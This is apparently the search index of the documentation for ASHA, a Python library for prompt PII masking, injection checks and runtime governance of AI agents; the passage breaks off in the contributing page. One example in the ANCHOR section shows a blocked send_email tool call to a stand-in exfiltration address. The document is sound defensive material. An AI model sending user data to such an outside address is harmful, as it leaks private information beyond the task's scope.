{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"ASHA Documentation","text":"<p>ASHA is a Python library for mission-aware agent governance and drop-in prompt security. Use <code>anchor()</code> to keep autonomous agents aligned with the user's goal, and <code>process()</code> / <code>wrap_llm()</code> to mask PII, check injection patterns, and compress prompts before they reach a model.</p> <p>Licensed under the Apache License 2.0.</p> <p>Developer preview (v0.4.2)</p> <p>Pre-1.0 \u2014 APIs may change. Install with <code>pip install asha-ai</code> (lite path; no API key or model download). See status.md for what works vs preview vs experimental. Pin a version only when you need a frozen pilot.</p>"},{"location":"#tutorial","title":"Tutorial","text":"<p>Learning-oriented \u2014 one path from install to a working result.</p> <ul> <li>Tutorial \u2014 install ASHA, process a prompt, wrap a client, govern a mock agent</li> </ul>"},{"location":"#how-to-guides","title":"How-to guides","text":"<p>Task-oriented \u2014 solve one problem when you already know the basics.</p> <ul> <li>Integrations \u2014 FastAPI, LangChain, Instructor, and related middleware</li> <li>Security \u2014 PII masking, threat checks, fail-closed modes</li> <li>Optimization \u2014 token compression and budgets</li> <li>Debugging \u2014 <code>trace=True</code>, diffs, degraded results</li> <li>Troubleshooting \u2014 common failures and fixes</li> <li>Performance \u2014 run benchmarks and tune latency vs security</li> <li>Migration v0.4 \u2014 upgrade from 0.3.x and PrivySHA \u2192 ASHA rename</li> </ul>"},{"location":"#reference","title":"Reference","text":"<p>Lookup-oriented \u2014 signatures, examples catalog, versioning facts.</p> <ul> <li>API reference</li> <li>Examples</li> <li>Versioning</li> <li>Deprecations</li> </ul>"},{"location":"#explanation","title":"Explanation","text":"<p>Understanding-oriented \u2014 design, rationale, and project direction.</p> <ul> <li>Core concepts</li> <li>Architecture</li> <li>ANCHOR</li> <li>Compliance</li> <li>Roadmap</li> <li>Production readiness (0.4.2)</li> <li>Experimental features</li> </ul>"},{"location":"#support","title":"Support","text":"<ul> <li>Support policy \u2014 channels, expectations, what to include in reports</li> <li>GitHub Discussions \u00b7 Slack</li> <li>FAQ</li> <li>Contributing</li> <li>Status</li> </ul>"},{"location":"anchor/","title":"ANCHOR","text":"<p>ANCHOR is ASHA's mission-aware governance layer for autonomous agents. It keeps agents aligned with a compiled mission contract, gates dangerous tool calls, detects suspicious action chains, validates plan outputs, and enforces OS-level side-effect constraints during tool execution.</p> <p>Governance runs at runtime \u2014 agents and prompts do not need to mention ANCHOR.</p> <p>Developer preview</p> <p>ANCHOR is preview in v0.4.2. Pin <code>asha==0.4.2</code> and validate on your agent stack. See status.md.</p>"},{"location":"anchor/#one-line-adoption","title":"One-line adoption","text":"<pre><code>from asha import Agent, anchor\n\nagent = anchor(\n    Agent(provider=\"mock\", model=\"mock\", tools=[\"read_file\", \"email\"]),\n    risk_tolerance=\"LOW\",\n    isolation=\"auto\",\n    interactive=False,  # required for scripts / CI\n)\nresult = agent.run(\"Analyze trends locally and write a report.\")\n</code></pre> <p>Framework-specific entry points:</p> <pre><code>from asha.runtime.anchor.adapters import (\n    anchor_crewai,\n    anchor_langchain,\n    anchor_graph,  # LangGraph\n    anchor_autogen,\n    anchor_llamaindex,\n    anchor_mcp,\n    anchor_any,\n)\n</code></pre> <p>Install only what you need (lite <code>pip install asha-ai</code> stays free of framework deps):</p> <pre><code>pip install asha-ai[crewai]\npip install asha-ai[langchain]\npip install asha-ai[langgraph]\npip install asha-ai[llamaindex]\npip install asha-ai[mcp]\npip install asha-ai[anchor]   # all of the above\n</code></pre>"},{"location":"anchor/#adapter-support-matrix","title":"Adapter support matrix","text":"Framework Tier Install Entry point CrewAI Supported (golden) <code>asha-ai[crewai]</code> <code>anchor_crewai()</code> LangChain Supported (golden) <code>asha-ai[langchain]</code> <code>anchor_langchain()</code> LangGraph Supported (golden) <code>asha-ai[langgraph]</code> <code>anchor_graph()</code> LlamaIndex Best-effort <code>asha-ai[llamaindex]</code> <code>anchor_llamaindex()</code> MCP Best-effort <code>asha-ai[mcp]</code> <code>anchor_mcp()</code> AutoGen Experimental (duck-typed) <code>anchor_autogen()</code> Generic Experimental (stdlib) <code>anchor_generic()</code> / <code>anchor_any()</code> <p>CI installs <code>asha-ai[anchor]</code> and runs golden-path + mission-drift gates headless (<code>ASHA_ANCHOR_INTERACTIVE=0</code>, <code>ASHA_ANCHOR_WARN_POLICY=strict</code>). Interactive ANCHOR demo: <code>streamlit run examples/showcase/streamlit_app.py</code> (Rogue agent page).</p>"},{"location":"anchor/#what-anchor-governs","title":"What ANCHOR governs","text":"Layer Applied Mission baseline + phase refresh kickoff / invoke / generate_reply Action guard + chain guard every tool call Memory guard after each agent step Plan guard after each agent step OS sandbox during tool execution Human approval BLOCK/REVIEW on TTY when <code>interactive=True</code> Framework Entry point What's wrapped CrewAI <code>anchor_crewai()</code> Crew, Agent, Task, Tool, LLM (litellm) LangChain <code>anchor_langchain()</code> AgentExecutor, Runnable, BaseTool, callbacks LangGraph <code>anchor_graph()</code> StateGraph / compiled graph (<code>invoke</code> / <code>ainvoke</code> / <code>stream</code> / <code>astream</code>) AutoGen <code>anchor_autogen()</code> function_map, register_for_execution LlamaIndex <code>anchor_llamaindex()</code> query/chat/run, agent_worker tools MCP <code>anchor_mcp()</code> call_tool / acall_tool (non-destructive proxy) Generic <code>anchor_generic()</code> any run/invoke + tools <p>Adapters are duck-typed. Missing optional packages raise a clear <code>pip install asha-ai[...]</code> hint when the target module requires that framework.</p>"},{"location":"anchor/#explicit-allow-block-checks","title":"Explicit ALLOW / BLOCK checks","text":"<pre><code>from asha.runtime.anchor import AnchorRuntime\nfrom asha.exceptions import ASHAAnchorBlocked\n\nruntime = AnchorRuntime(warn_policy=\"strict\", interactive=False, risk_tolerance=\"LOW\")\nruntime.initialize_mission(\n    \"Analyze Q1 sales locally and write a report. Do not send data externally.\",\n    context={\n        \"available_tools\": [\"load_sales_data\", \"write_report\", \"send_email\"],\n        \"local_only\": True,\n    },\n)\n\nassert runtime.evaluate_action_request(\n    \"tool_call\",\n    {\n        \"tool_name\": \"write_report\",\n        \"arguments\": str({\"args\": (), \"kwargs\": {\"report_content\": \"Q1 summary\"}}),\n    },\n)\n\ntry:\n    runtime.evaluate_action_request(\n        \"tool_call\",\n        {\n            \"tool_name\": \"send_email\",\n            \"arguments\": str({\"args\": (), \"kwargs\": {\"to\": \"exfil@evil.com\"}}),\n        },\n        raise_on_block=True,\n    )\nexcept ASHAAnchorBlocked as err:\n    print(err)\n</code></pre>"},{"location":"anchor/#framework-sketches","title":"Framework sketches","text":"<p>These assume the optional framework package is installed.</p>"},{"location":"anchor/#crewai","title":"CrewAI","text":"<pre><code>from crewai import Crew\nfrom asha.runtime.anchor.adapters import anchor_crewai\n\ncrew = Crew(agents=[...], tasks=[...])\ncrew = anchor_crewai(crew, risk_tolerance=\"LOW\", isolation=\"auto\", interactive=False)\ncrew.kickoff(inputs={\"topic\": \"Generative AI\"})\n</code></pre>"},{"location":"anchor/#langchain","title":"LangChain","text":"<pre><code>from langchain.agents import AgentExecutor\nfrom asha.runtime.anchor.adapters import anchor_langchain\n\nexecutor = AgentExecutor(agent=agent, tools=tools)\nexecutor = anchor_langchain(executor, risk_tolerance=\"LOW\", interactive=False)\nresult = executor.invoke({\"input\": \"Analyze trends locally.\"})\n</code></pre>"},{"location":"anchor/#langgraph","title":"LangGraph","text":"<pre><code>from langgraph.graph import StateGraph\nfrom asha.runtime.anchor.adapters import anchor_graph\n\ngraph = StateGraph(...)\n# wrap before or after compile \u2014 both work\napp = anchor_graph(graph.compile(), risk_tolerance=\"LOW\", interactive=False)\napp.invoke({\"messages\": [...]})\n</code></pre>"},{"location":"anchor/#autogen","title":"AutoGen","text":"<pre><code>from autogen import ConversableAgent\nfrom asha.runtime.anchor.adapters import anchor_autogen\n\nagent = ConversableAgent(\"analyst\", llm_config={...})\nagent = anchor_autogen(agent, risk_tolerance=\"LOW\", interactive=False)\nagent.generate_reply(messages=[{\"role\": \"user\", \"content\": \"Analyze locally.\"}])\n</code></pre>"},{"location":"anchor/#llamaindex","title":"LlamaIndex","text":"<pre><code>from llama_index.core.agent import ReActAgent\nfrom asha.runtime.anchor.adapters import anchor_llamaindex\n\nagent = ReActAgent.from_tools(tools, llm=llm)\nagent = anchor_llamaindex(agent, risk_tolerance=\"LOW\", interactive=False)\nagent.query(\"Analyze trends locally and write a report.\")\n</code></pre>"},{"location":"anchor/#mcp","title":"MCP","text":"<pre><code>from asha.runtime.anchor.adapters import anchor_mcp\n\nserver = anchor_mcp(mcp_server, risk_tolerance=\"LOW\", interactive=False)\nserver.initialize_session(\"Analyze data locally. Do not exfiltrate.\")\nresult = server.call_tool(\"read_file\", {\"path\": \"data/trends.csv\"})\n</code></pre>"},{"location":"anchor/#os-sandbox","title":"OS sandbox","text":"Mode Behavior <code>off</code> No sandbox enforcement <code>auto</code> (default) In-process hooks: guarded <code>open()</code>, blocked network modules (best-effort \u2014 not a full OS jail) <code>hard</code> / <code>subprocess</code> Tool runs in an isolated child process <pre><code>from asha import Agent, anchor\n\nagent = anchor(Agent(provider=\"mock\", model=\"mock\"), isolation=\"hard\", interactive=False)\n</code></pre> <p>Supported modes: <code>off</code>, <code>auto</code> (in-process hooks), <code>hard</code> / <code>subprocess</code> (child process). This is preview isolation, not a container/seccomp jail. Container backends (<code>docker</code>, <code>bwrap</code>) raise a clear error and are deferred to 0.5.x \u2014 use <code>hard</code> today when you need process isolation.</p>"},{"location":"anchor/#human-approval","title":"Human approval","text":"<p>When <code>interactive=True</code> (or a TTY with default resolution), ANCHOR can prompt on BLOCK/REVIEW:</p> <pre><code>ANCHOR HUMAN APPROVAL REQUIRED\nReason: ...\nAllow this action? [y/N]:\n</code></pre> <p>Configure with <code>interactive=True/False</code>, <code>ASHA_ANCHOR_INTERACTIVE=0</code>, or <code>warn_policy=\"strict\"|\"permissive\"</code>.</p>"},{"location":"anchor/#mental-model","title":"Mental model","text":"<pre><code>User mission prompt\n       \u2502\n       \u25bc\n Mission contract (immutable baseline + phases)\n       \u2502\n       \u25bc\n Tool call / memory write / plan output\n       \u2502\n       \u251c\u2500\u2500 Action / alignment checks\n       \u251c\u2500\u2500 Chain checks\n       \u251c\u2500\u2500 Memory checks\n       \u251c\u2500\u2500 Plan checks\n       \u2514\u2500\u2500 Approval (TTY or headless policy)\n       \u2502\n       \u25bc\n Sandbox (hooks or subprocess)\n</code></pre> <p>Public docs describe the governance shape, not internal detector scores or calibration tables.</p>"},{"location":"anchor/#api-surface","title":"API surface","text":"Function Description <code>anchor(target)</code> Universal one-line adoption (<code>from asha import anchor</code>) <code>anchor_any(target)</code> Adapter registry dispatch <code>anchor_crewai</code> / <code>anchor_langchain</code> / \u2026 Framework wrappers <code>AnchorRuntime</code> Direct mission + <code>evaluate_action_request</code>"},{"location":"anchor/#environment-variables","title":"Environment variables","text":"Variable Default Description <code>ASHA_ANCHOR_INTERACTIVE</code> auto (TTY) <code>0</code> disables human approval prompts <code>ASHA_ANCHOR_WARN_POLICY</code> permissive (headless) <code>strict</code> escalates WARN / REVIEW more aggressively <code>ASHA_ANCHOR_TELEMETRY</code> off <code>1</code> enables local JSONL telemetry (opt-in) <code>ASHA_ANCHOR_TELEMETRY_PATH</code> \u2014 Explicit telemetry file path (also enables logging)"},{"location":"anchor/#related","title":"Related","text":"<ul> <li>Tutorial</li> <li>Architecture</li> <li>Status</li> <li>Security</li> </ul>"},{"location":"api-reference/","title":"API Reference","text":"<p>ASHA v0.4.2 - canonical signatures and import paths.</p>"},{"location":"api-reference/#import-map","title":"Import map","text":"<pre><code># Root (only these)\nfrom asha import process, sanitize, optimize, Agent, anchor\n\n# ANCHOR (also available from root)\nfrom asha.runtime.anchor import anchor_any\nfrom asha.runtime.anchor.adapters import anchor_crewai, anchor_langchain\n\n# Subpackages\nfrom asha.integrations import wrap_llm, auto_patch\nfrom asha.runtime import PromptProcessor, ExecutionProfile\nfrom asha.types import ProcessResult, SanitizeResult, OptimizeResult, AgentResult\nfrom asha.core.policy_config import PolicyConfig, PolicyMode\nfrom asha.utils.dropin import process_async, optimize_async, sanitize_async\nfrom asha.utils.unmask import unmask\nfrom asha.runtime.local_advisor.advisor import recommend_local_model\nfrom asha.runtime.adapters.factory import AdapterFactory\nfrom asha.compat.legacy_results import to_legacy_pipeline_dict\n</code></pre>"},{"location":"api-reference/#result-types","title":"Result types","text":"<pre><code>result = process(\"prompt\")  # ProcessResult\n\nresult.output\nresult.original\nresult.degraded\nresult.degraded_reason\nresult.security       # SecurityInfo | None\nresult.metrics        # MetricsInfo | None\nresult.trace          # dict | None (trace=True)\nresult.diff           # str | None (debug=True)\nstr(result)           # == result.output\nresult.to_dict()      # legacy dict shape\n</code></pre>"},{"location":"api-reference/#process","title":"process()","text":"<pre><code>from asha import process\nfrom asha.core.policy_config import PolicyConfig\n\nresult = process(\n    prompt: str,\n    mode: str = \"balanced\",           # strict | balanced | lite | off\n    *,\n    policy: PolicyConfig | None = None,\n    token_budget: int = 1200,\n    trace: bool = False,\n    debug: bool = False,\n    max_retries: int = 0,\n    timeout_seconds: float | None = None,\n    verbose: bool = False,\n    log_level: str = \"INFO\",\n    log_output: str = \"console\",\n    log_file: str | None = None,\n    include_legacy_detail: bool = False,\n) -&gt; ProcessResult\n</code></pre> Mode Behavior <code>strict</code> Fail-closed - raises on total failure <code>balanced</code> Fail-open fallback (default) <code>lite</code> Minimal policy; fail-open <code>off</code> Passthrough <p><code>PolicyConfig</code> fields: <code>pii_mode</code>, <code>reversible</code>, <code>preserve_intent</code>, <code>security_level</code>, stage enable flags.</p>"},{"location":"api-reference/#sanitize","title":"sanitize()","text":"<pre><code>from asha import sanitize\n\nresult = sanitize(\n    prompt: str,\n    mode: str = \"balanced\",\n    *,\n    policy: PolicyConfig | None = None,\n    trace: bool = False,\n    debug: bool = False,\n    max_retries: int = 0,\n    timeout_seconds: float | None = None,\n    verbose: bool = False,\n) -&gt; SanitizeResult\n</code></pre>"},{"location":"api-reference/#optimize","title":"optimize()","text":"<pre><code>from asha import optimize\n\nresult = optimize(\n    prompt: str,\n    *,\n    token_budget: int = 1200,\n    trace: bool = False,\n    debug: bool = False,\n    timeout_seconds: float | None = None,\n) -&gt; OptimizeResult\n</code></pre> <p>Token compression only - no security or compile stages.</p>"},{"location":"api-reference/#wrap_llm","title":"wrap_llm()","text":"<pre><code>from asha.integrations import wrap_llm\n\nclient = wrap_llm(\n    client,\n    mode: str = \"balanced\",\n    token_budget: int = 1200,\n    auto_select_local_model: bool = False,\n    sample_prompts: list[str] | None = None,\n)\n</code></pre> <ul> <li><code>mode=\"off\"</code> - no preprocessing</li> <li>Processing errors: strict raises; balanced degrades</li> <li>Wrap infrastructure errors raise when <code>mode != \"off\"</code></li> </ul>"},{"location":"api-reference/#auto_patch","title":"auto_patch()","text":"<pre><code>from asha.integrations import auto_patch\nfrom asha.integrations.auto_patch import (\n    get_patch_status,\n    disable_auto_patch,\n    enable_auto_patch,\n)\n\nauto_patch(mode: str = \"strict\", enable: bool = True, verbose: bool = False)\n</code></pre> <p>Globally patches installed SDKs. Prefer <code>wrap_llm()</code> for production.</p>"},{"location":"api-reference/#async","title":"Async","text":"<pre><code>from asha.utils.dropin import process_async, sanitize_async, optimize_async\n\nresult = await process_async(\"prompt\", mode=\"balanced\")\n</code></pre>"},{"location":"api-reference/#unmask","title":"unmask()","text":"<pre><code>from asha.utils.unmask import unmask\n\nrestored = unmask(llm_output, masking_map)\n</code></pre> <p>Requires <code>policy=PolicyConfig(reversible=True)</code> during <code>process()</code> / <code>sanitize()</code>.</p>"},{"location":"api-reference/#agent","title":"Agent","text":"<pre><code>from asha import Agent\n\nagent = Agent(\n    model: str = \"gpt-4o-mini\",\n    privacy: bool = True,\n    token_budget: int = 1200,\n    provider: str | None = None,\n    fallback_providers: list[dict] | None = None,\n    routing_config: dict[str, str] | None = None,\n    timeout: int = 10,\n    retries: int = 3,\n    api_key: str | None = None,\n    local_model: str | None = None,\n    sample_prompts: list[str] | None = None,\n)\n\n# Returns str by default\nresponse = agent.run(prompt, trace=False, task_type=\"chat\")\n\n# Returns AgentResult when trace=True\nresult = agent.run(prompt, trace=True)\n</code></pre> <p><code>privacy=True</code> \u2192 internal <code>mode=\"strict\"</code>. <code>privacy=False</code> \u2192 <code>mode=\"off\"</code>.</p>"},{"location":"api-reference/#promptprocessor","title":"PromptProcessor","text":"<pre><code>from asha.runtime import PromptProcessor, ExecutionProfile\n\nprocessor = PromptProcessor()\nresult = processor.run(\"prompt\", mode=\"balanced\", profile=ExecutionProfile(...))\n</code></pre>"},{"location":"api-reference/#recommend_local_model-experimental","title":"recommend_local_model() (experimental)","text":"<pre><code>from asha.runtime.local_advisor.advisor import recommend_local_model\n\nreport = recommend_local_model(\n    prompts: list[str] | None = None,\n    prompts_file: str | None = None,\n    mode: str = \"balanced\",\n    top: int = 5,\n    gpu: str | None = None,\n    vram_gb: float | None = None,\n    cpu_only: bool = False,\n    refresh_catalog: bool = False,\n    preferred_quant: str | None = None,\n    probe: bool = False,\n)\n</code></pre> <p>Experimental \u2014 API may change</p> <p>See experimental-features.md.</p>"},{"location":"api-reference/#adapterfactory-experimental","title":"AdapterFactory (experimental)","text":"<pre><code>from asha.runtime.adapters.factory import AdapterFactory\n\nadapter = AdapterFactory.create(provider=\"openai\", model=\"gpt-4o-mini\")\nadapter = AdapterFactory.create(provider=\"mock\")\nadapter = AdapterFactory.create_smart_routing({\"chat\": \"gpt-4o-mini\"})\n</code></pre> <p>Providers: <code>openai</code>, <code>anthropic</code>, <code>gemini</code>, <code>ollama</code>, <code>huggingface</code>, <code>grok</code>, <code>mock</code>.</p> <p>Smart routing and factory helpers may change \u2014 see experimental-features.md.</p>"},{"location":"api-reference/#legacy-dict","title":"Legacy dict","text":"<pre><code>from asha.compat.legacy_results import to_legacy_pipeline_dict\n\nlegacy = to_legacy_pipeline_dict(\n    process(\"prompt\", include_legacy_detail=True)\n)\n</code></pre>"},{"location":"api-reference/#cli","title":"CLI","text":"Command Description <code>asha \"prompt\"</code> Demo process <code>asha quick-test</code> Built-in tests <code>asha examples</code> Sample transformations <code>asha benchmark</code> Benchmark harness <code>asha recommend</code> AshaFit advisor"},{"location":"api-reference/#environment-variables","title":"Environment variables","text":"Variable Purpose <code>OPENAI_API_KEY</code> / <code>ANTHROPIC_API_KEY</code> / <code>GOOGLE_API_KEY</code> / <code>GEMINI_API_KEY</code> / <code>GROK_API_KEY</code> Provider adapters / live demos <code>ASHA_PROVIDER</code> / <code>ASHA_MODEL</code> <code>Agent.from_env()</code> / adapter factory <code>ASHA_TOKEN_BUDGET</code> / <code>ASHA_TIMEOUT</code> / <code>ASHA_RETRIES</code> Agent / adapter defaults <code>ASHA_PRIVACY</code> <code>Agent.from_env()</code> privacy flag (<code>true</code>/<code>false</code>) <code>ASHA_MODELS_DIR</code> Use a local models tree (skip default cache layout) <code>ASHA_MODELS_URL</code> Override hardened-models download URL <code>ASHA_MODELS_ZIP</code> Local zip fallback for the models bundle <code>ASHA_MODELS_CACHE</code> Override cache directory (<code>~/.cache/asha/models</code> default) <code>ASHA_DISABLE_MODEL_DOWNLOAD</code> <code>1</code> \u2014 never fetch models (CI / air-gap) <code>ASHA_DISABLE_ML</code> Disable ML/NER paths where checked <code>ASHA_THRESHOLDS_PATH</code> Override packaged detector thresholds YAML <code>ASHA_INJECTION_MODE</code> Injection detector mode override <code>ASHA_ENABLE_HF_SAFETY</code> Opt-in Hugging Face safety path <code>ASHA_OPTIMIZER_EMBEDDING</code> Optimizer embedding mode hint <code>ASHA_ANCHOR_INTERACTIVE</code> ANCHOR interactive approval (<code>0</code>/<code>1</code>) <code>ASHA_ANCHOR_WARN_POLICY</code> ANCHOR warn policy (<code>strict</code> / <code>permissive</code> / \u2026) <code>ASHA_ANCHOR_TELEMETRY</code> / <code>ASHA_ANCHOR_TELEMETRY_PATH</code> Opt-in ANCHOR telemetry <code>ASHA_CACHE_DIR</code> Local advisor catalog cache <p><code>mode</code> is not read from env \u2014 set per call. See also <code>.env.example</code>.</p>"},{"location":"api-reference/#errors","title":"Errors","text":"Exception When <code>ASHAProcessingError</code> <code>mode=\"strict\"</code> total failure <code>TypeError</code> Unknown kwargs on <code>process()</code> / <code>sanitize()</code> <code>AttributeError</code> Removed root exports (<code>wrap_llm</code>, <code>Pipeline</code>, etc.) <p>See migration-v0.4.md and deprecations.md.</p>"},{"location":"architecture/","title":"Architecture","text":"<p>ASHA v0.4.2 \u2014 compiler-inspired prompt processing with strict layer boundaries, plus a separate ANCHOR runtime for agent governance.</p> <p>This page explains the current mental model. It is not a how-to and not an API reference.</p>"},{"location":"architecture/#prompt-processing-flow","title":"Prompt processing flow","text":"<pre><code>User input\n    \u2502\n    \u25bc\nSecurity (run_security)      \u2190 PII detection, injection checks, masking\n    \u2502\n    \u25bc\nCompilation (compile_prompt) \u2190 internal representation \u2192 structured prompt\n    \u2502\n    \u25bc\nOptimization (optimize_tokens) \u2190 token compression (MSDPC)\n    \u2502\n    \u25bc\nProcessResult                \u2190 typed output, metrics, optional trace\n</code></pre> <p><code>process()</code> runs all three engines. <code>sanitize()</code> runs security only. <code>optimize()</code> runs token compression only. <code>mode=\"off\"</code> skips engines via the policy gate.</p> <p>You interact with this pipeline as a black box through the drop-in API. Use <code>trace=True</code> when you need stage visibility.</p> <p><code>Agent</code> adds model routing and LLM generation on top of the same preprocessing path.</p>"},{"location":"architecture/#anchor-agent-governance","title":"ANCHOR (agent governance)","text":"<p>ANCHOR sits beside the prompt pipeline. It does not replace <code>process()</code>; it governs autonomous agents at runtime:</p> <pre><code>User prompt \u2192 Mission contract (immutable)\n                    \u2193\n        Action / memory / plan / chain guards \u2192 ALLOW | WARN | BLOCK | REVIEW\n                    \u2193\n        Process sandbox (hooks or subprocess) \u2192 execution or halt\n</code></pre> <p>Adoption is typically <code>anchor(agent)</code> or a framework adapter. Details: anchor.md.</p>"},{"location":"architecture/#package-layout","title":"Package layout","text":"<pre><code>src/asha/\n\u251c\u2500\u2500 __init__.py              # process, sanitize, optimize, Agent, anchor\n\u251c\u2500\u2500 core/                    # engines, policy, security, compiler (IR is internal)\n\u2502   \u251c\u2500\u2500 engines.py\n\u2502   \u251c\u2500\u2500 policy_config.py\n\u2502   \u251c\u2500\u2500 security/\n\u2502   \u251c\u2500\u2500 compiler/\n\u2502   \u2514\u2500\u2500 _ir/                 # internal \u2014 not a public API\n\u251c\u2500\u2500 runtime/                 # orchestration\n\u2502   \u251c\u2500\u2500 processor.py         # PromptProcessor \u2014 sole prompt orchestrator\n\u2502   \u251c\u2500\u2500 agent.py\n\u2502   \u251c\u2500\u2500 adapters/\n\u2502   \u251c\u2500\u2500 routing/             # experimental smart routing\n\u2502   \u251c\u2500\u2500 local_advisor/       # experimental AshaFit\n\u2502   \u2514\u2500\u2500 anchor/              # ANCHOR governance\n\u251c\u2500\u2500 integrations/            # wrap_llm, auto_patch, framework middleware\n\u251c\u2500\u2500 types/                   # ProcessResult, SanitizeResult, OptimizeResult\n\u251c\u2500\u2500 utils/                   # dropin, unmask\n\u251c\u2500\u2500 compat/                  # opt-in legacy helpers only\n\u2514\u2500\u2500 cli/\n</code></pre>"},{"location":"architecture/#layer-boundaries","title":"Layer boundaries","text":"Layer May import Must not import <code>core/</code> stdlib, third-party <code>runtime</code>, <code>integrations</code>, <code>compat</code> <code>runtime/</code> <code>core</code>, <code>types</code> <code>integrations</code>, <code>compat</code> <code>types/</code> <code>core</code> (minimal) <code>compat</code>, <code>runtime</code>, <code>integrations</code> <code>utils/</code> <code>runtime</code>, <code>core</code>, <code>types</code> <code>compat</code> <code>integrations/</code> <code>runtime</code>, <code>core</code>, <code>utils</code> \u2014 <code>compat/</code> anything \u2014 (legacy helpers only) <p>Enforced by <code>tests/architecture/test_boundaries.py</code>.</p>"},{"location":"architecture/#design-principles","title":"Design principles","text":""},{"location":"architecture/#drop-in-first","title":"Drop-in first","text":"<p>Primary adoption is <code>process()</code>, <code>sanitize()</code>, <code>optimize()</code>. Client wrapping lives in <code>asha.integrations.wrap_llm</code>.</p>"},{"location":"architecture/#safety-modes","title":"Safety modes","text":"Mode Behavior <code>strict</code> Fail-closed \u2014 raises on total failure <code>balanced</code> Fail-open with rule-based fallback (default) <code>lite</code> Minimal policy features; fail-open like balanced <code>off</code> Passthrough <p>Advanced policy uses <code>PolicyConfig</code> (<code>pii_mode</code>, <code>reversible</code>, <code>preserve_intent</code>, \u2026). Default <code>pii_mode</code> is <code>\"hybrid\"</code> and soft-falls back when ML deps are missing.</p>"},{"location":"architecture/#hot-path","title":"Hot path","text":"<p><code>utils/dropin.process()</code> \u2192 <code>runtime/resolve.resolve_process_call()</code> \u2192 <code>PromptProcessor.run(...)</code>.</p> <p><code>compat/</code> is not on the hot path.</p>"},{"location":"architecture/#legacy-dict-shapes","title":"Legacy dict shapes","text":"<p>Opt-in only:</p> <pre><code>from asha.compat.legacy_results import to_legacy_pipeline_dict\n\nlegacy = to_legacy_pipeline_dict(process(\"prompt\", include_legacy_detail=True))\n</code></pre>"},{"location":"architecture/#pii-detection-shape","title":"PII detection shape","text":"<ol> <li>Rule-based patterns in <code>core/security/</code> \u2014 always available</li> <li>Multi-phase pipeline in <code>core/pii_pipeline/</code> \u2014 normalization \u2192 detection \u2192 verification \u2192 scoring \u2192 masking</li> <li>Hybrid ML \u2014 optional via <code>pip install asha-ai[ml]</code></li> </ol> <p>Public docs describe the defense shape (layered detection, calibrated fail-closed behavior), not internal scoring mechanics.</p>"},{"location":"architecture/#observability","title":"Observability","text":"<ul> <li><code>process(..., trace=True)</code> / <code>debug=True</code></li> <li>Optional OpenTelemetry via <code>pip install asha-ai[otel]</code></li> </ul>"},{"location":"architecture/#related","title":"Related","text":"<ul> <li>Core concepts</li> <li>API reference</li> <li>Security</li> <li>ANCHOR</li> <li>Status</li> </ul>"},{"location":"compliance/","title":"Compliance","text":"<p>ASHA v0.4.2 - privacy tooling, not a certified compliance product.</p>"},{"location":"compliance/#what-asha-provides","title":"What ASHA provides","text":"<ul> <li>PII detection and masking before LLM calls</li> <li>Configurable fail-closed mode (<code>mode=\"strict\"</code>)</li> <li>Audit-friendly typed results (<code>ProcessResult.security</code>, traces)</li> <li>Local preprocessing without sending raw PII to cloud models (when self-hosted)</li> </ul>"},{"location":"compliance/#what-asha-does-not-provide","title":"What ASHA does not provide","text":"<ul> <li>Legal compliance certification (GDPR, HIPAA, SOC 2, etc.)</li> <li>Data processing agreements or audit reports</li> <li>Guaranteed detection of all PII in all locales</li> <li>Replacement for organizational privacy policies</li> </ul>"},{"location":"compliance/#recommended-practices","title":"Recommended practices","text":"<ol> <li>Pin the version - <code>asha==0.4.2</code></li> <li>Use <code>mode=\"strict\"</code> for regulated paths where failure must block</li> <li>Prefer <code>wrap_llm()</code> over <code>auto_patch()</code> for scoped control</li> <li>Log <code>result.degraded</code> in balanced mode - indicates fallback was used</li> <li>Review mask formats - <code>[EMAIL_HASH]_*</code> tokens, not reversible by default</li> <li>Combine with org controls - access policies, retention, DPA with LLM vendor</li> </ol>"},{"location":"compliance/#reversible-masking","title":"Reversible masking","text":"<p>Only enable when you have a documented need to restore values in LLM output:</p> <pre><code>from asha.core.policy_config import PolicyConfig\nsanitize(prompt, policy=PolicyConfig(reversible=True))\n</code></pre> <p>Store <code>masking_map</code> securely - it can reverse pseudonymization.</p>"},{"location":"compliance/#data-residency","title":"Data residency","text":"<p><code>process()</code> and <code>sanitize()</code> run locally. LLM calls via <code>Agent</code> or <code>wrap_llm</code> send processed prompts to the provider you configure.</p>"},{"location":"compliance/#related","title":"Related","text":"<ul> <li>security.md</li> <li>status.md</li> </ul>"},{"location":"contributing/","title":"Contributing","text":"<p>ASHA v0.4.2 - development guide.</p> <p>Support channels and expectations: support.md.</p> <ul> <li>Questions / design: GitHub Discussions</li> <li>Optional chat: ASHA Slack</li> <li>Security reports: follow the repo SECURITY.md (do not open public issues).</li> </ul>"},{"location":"contributing/#setup","title":"Setup","text":"<pre><code>git clone https://github.com/AjayRajan05/ASHA.git\ncd ASHA\npip install -e \".[dev]\"\n</code></pre> <p>Python 3.10+ required.</p>"},{"location":"contributing/#run-tests","title":"Run tests","text":"<pre><code># Full suite\npytest tests -q\n\n# Architecture boundaries only\npytest tests/architecture -q\n\n# With coverage (CI uses --cov-fail-under=50)\npytest --cov=asha --cov-report=term -m \"not slow\"\n</code></pre>"},{"location":"contributing/#framework-integration-tests-optional-deps","title":"Framework integration tests (optional deps)","text":"<pre><code>pip install -e \".[dev,integrations,flask,django,anchor]\"\nASHA_ANCHOR_INTERACTIVE=0 ASHA_ANCHOR_WARN_POLICY=strict \\\n  pytest tests/test_framework_smoke.py tests/test_fastapi_integration.py \\\n  tests/test_django_integration.py tests/test_langchain_integration.py \\\n  tests/test_llamaindex_integration.py tests/test_instructor_integration.py \\\n  tests/runtime/anchor/test_anchor_*_integration.py \\\n  tests/runtime/anchor/test_mission_drift_gate.py -q\n</code></pre>"},{"location":"contributing/#architecture-rules","title":"Architecture rules","text":"<p>Enforced by <code>tests/architecture/test_boundaries.py</code>:</p> Layer Must not import <code>core/</code> <code>runtime</code>, <code>integrations</code>, <code>compat</code> <code>runtime/</code> <code>integrations</code>, <code>compat</code> <code>types/</code> <code>compat</code>, <code>runtime</code>, <code>integrations</code> <code>utils/</code> <code>compat</code> <p>Do not reintroduce <code>Pipeline</code>, root lazy exports, or <code>compat/</code> on the <code>process()</code> hot path.</p>"},{"location":"contributing/#package-layout","title":"Package layout","text":"<pre><code>src/asha/\n\u251c\u2500\u2500 core/           # engines, policy, security, compiler\n\u251c\u2500\u2500 runtime/        # 